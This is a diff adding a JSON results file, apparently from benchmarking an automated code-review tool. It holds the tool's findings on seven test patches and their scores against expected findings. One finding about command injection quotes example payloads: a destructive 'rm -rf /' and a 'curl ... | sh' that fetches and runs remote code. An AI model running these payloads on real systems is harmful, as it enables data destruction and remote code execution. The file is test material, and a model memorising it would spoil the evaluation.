@@ -1,0 +1,248 @@
+{
+  "static_surface_reduction": {
+    "local": {
+      "total_words_with_scale": 84216,
+      "scale_words": 4110,
+      "total_words_when_not_needed": 80106,
+      "reduction_pct": 4.88
+    },
+    "github": {
+      "total_words_with_scale": 113552,
+      "scale_words": 4110,
+      "total_words_when_not_needed": 109442,
+      "reduction_pct": 3.62
+    }
+  },
+  "behavioral_proof": {
+    "run": {
+      "ok": true,
+      "cases": [
+        {
+          "id": "correctness-off-by-one-pagination",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P1",
+              "location": {
+                "path": "app/pagination.py",
+                "line": 3
+              },
+              "claim": "`page()` returns one extra item per page `end = offset + page_size + 1` widens the slice `items[offset:end]` by one element beyond `page_size`. For `page_number=1, page_size=2` over `[1,2,3,4,5]`, `offset=0`, `end=3`, returning `[1,2,3]` (3 items, not 2); page 2 then returns `items[2:5] = [3,4,5]`, so item `3` is duplicated across pages 1 and 2. Every page is one element too long and overlaps with the next page's first element \u2014 callers relying on `page_size`-sized pages get incorrect counts, and any consumer paginating through all pages (e.g. building a full list, or a UI \"load more\") will see duplicated records.",
+              "extra": {
+                "defect_kind": "off-by-one"
+              }
+            }
+          ]
+        },
+        {
+          "id": "no-op-comment-and-rename",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": []
+        },
+        {
+          "id": "quality-duplicated-branch-logic",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P2",
+              "location": {
+                "path": "app/notify.py",
+                "lines": {
+                  "start": 3,
+                  "end": 7
+                }
+              },
+              "claim": "Duplicated branch logic for message formatting Both the `email` branch (`app/notify.py:3`) and the new `sms` branch (`app/notify.py:6`) independently call `msg = format_message(user)` before dispatching to their respective senders \u2014 the same statement is now repeated verbatim across both branches of the `if/elif`. Adding a third notification kind (or changing how the message is formatted) requires updating the same line in multiple branches, and it's easy to miss one, leaving formatting logic to drift between channels.",
+              "extra": {
+                "defect_kind": "duplicated-logic"
+              }
+            }
+          ]
+        },
+        {
+          "id": "security-command-injection",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "app/backup.py",
+                "line": 5
+              },
+              "claim": "`make_archive` is vulnerable to OS command injection via unsanitized `name` `cmd = f\"tar -czf {name}.tar.gz data/\"` is passed to `subprocess.run(cmd, shell=True, check=True)`. `name` is interpolated into the command string with no escaping, quoting, or allow-list validation, and the prior implementation (`args = [\"tar\", \"-czf\", name + \".tar.gz\", \"data/\"]` with no `shell=True`) already shows argument-list execution was the established, safe pattern this change abandons. Any caller that passes an attacker-influenced `name` (e.g. a filename derived from user input, an API parameter, or an uploaded record identifier) can inject arbitrary shell syntax \u2014 e.g. `name = \"x; rm -rf / #\"` or `name = \"$(curl evil.sh|sh)\"` \u2014 achieving arbitrary command execution with the privileges of the process running `make_archive`.",
+              "extra": {
+                "defect_kind": "command-injection"
+              }
+            }
+          ]
+        },
+        {
+          "id": "repo-intel-python-control-compatible-caller-no-finding",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": []
+        },
+        {
+          "id": "repo-intel-python-call-site-caller-null-deref",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P1",
+              "location": {
+                "path": "app/users/lookup.py",
+                "lines": {
+                  "start": 4,
+                  "end": 5
+                }
+              },
+              "claim": "`get_user` no longer raises `UserNotFound`, so `charge_user` dereferences `None` The diff removes the `UserNotFound` import and the `if user is None: raise UserNotFound(user_id)` guard from `get_user`, which now just returns `find_user(user_id)` directly. Its only caller, `app/billing/charge.py:6-10`, still wraps `get_user(user_id)` in `try/except UserNotFound` and, on the non-exception path, immediately accesses `user.account_id`. For any `user_id` that `find_user` doesn't resolve, `get_user` now returns `None` instead of raising. `charge_user`'s `except UserNotFound` never fires, and `user.account_id` on the next line raises an unhandled `AttributeError`, crashing the charge flow instead of returning the intended `declined(\"no such user\")` response.",
+              "extra": {
+                "defect_kind": "null-dereference"
+              }
+            }
+          ]
+        },
+        {
+          "id": "scale-progressive-loading-proof-ambiguous-public-export-forces-fail-closed-expansion",
+          "input_kind": "patch",
+          "status": "executed",
+          "produced_findings": [
+            {
+              "severity": "P0",
+              "location": {
+                "path": "app/pricing/discount.py",
+                "line": 7
+              },
+              "claim": "`apply_discount` switched from ceil to floor, breaking the payment-processor minimum-charge invariant The change replaces `math.ceil(discounted)` with `math.floor(discounted)`. The only caller, `app/pricing/__init__.py:9` (`total_after_discount`), asserts `discounted >= 50 or amount_cents < 50`, with the comment \"Rounding up on the discount keeps the charged total from dipping below the minimum payment-processor charge of 50 cents on small carts\" \u2014 an invariant that depended on `ceil`. For `amount_cents=50, pct=1`: `discounted_raw = 49.5`; `ceil` \u2192 `50` (assert holds), `floor` \u2192 `49` (assert fails). `total_after_discount` now raises `AssertionError` for small carts with a discount applied (a live production regression, not a hypothetical), and if assertions are stripped (`python -O`) it silently returns a total below the payment processor's 50-cent minimum charge instead.",
+              "extra": {
+                "defect_kind": "broken-invariant"
+              }
+            }
+          ]
+        }
+      ]
+    },
+    "regression_vs_408_baseline": {
+      "cases": [
+        {
+          "id": "correctness-off-by-one-pagination",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "no-op-comment-and-rename",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "quality-duplicated-branch-logic",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "security-command-injection",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        }
+      ],
+      "aggregate": {
+        "total_false_negatives": 0,
+        "total_false_positives": 0,
+        "cases_with_false_negatives": 0,
+        "cases_with_false_positives": 0,
+        "total_near_misses": 0,
+        "errored_cases": 0
+      }
+    },
+    "activation_required_cases": {
+      "cases": [
+        {
+          "id": "repo-intel-python-call-site-caller-null-deref",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 1,
+          "false_positives": 1,
+          "missed_keys": [
+            "charge-user-null-deref-after-get-user-contract-change"
+          ],
+          "incorrect_indices": [
+            0
+          ],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "repo-intel-python-control-compatible-caller-no-finding",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        },
+        {
+          "id": "scale-progressive-loading-proof-ambiguous-public-export-forces-fail-closed-expansion",
+          "status": "executed",
+          "findings_completeness": "exhaustive",
+          "false_negatives": 0,
+          "false_positives": 0,
+          "missed_keys": [],
+          "incorrect_indices": [],
+          "near_misses": 0,
+          "absorbed_extra_match": 0,
+          "tolerated_unexpected": 0
+        }
+      ],
+      "aggregate": {
+        "total_false_negatives": 1,
+        "total_false_positives": 1,
+        "cases_with_false_negatives": 1,
+        "cases_with_false_positives": 1,
+        "total_near_misses": 0,
+        "errored_cases": 0
+      }
+    },
+    "case_roles": {
+      "repo-intel-python-control-compatible-caller-no-finding": "not-needed",
+      "repo-intel-python-call-site-caller-null-deref": "must-activate",
+      "scale-progressive-loading-proof-ambiguous-public-export-forces-fail-closed-expansion": "ambiguous-fail-closed"
+    }
+  }
+}
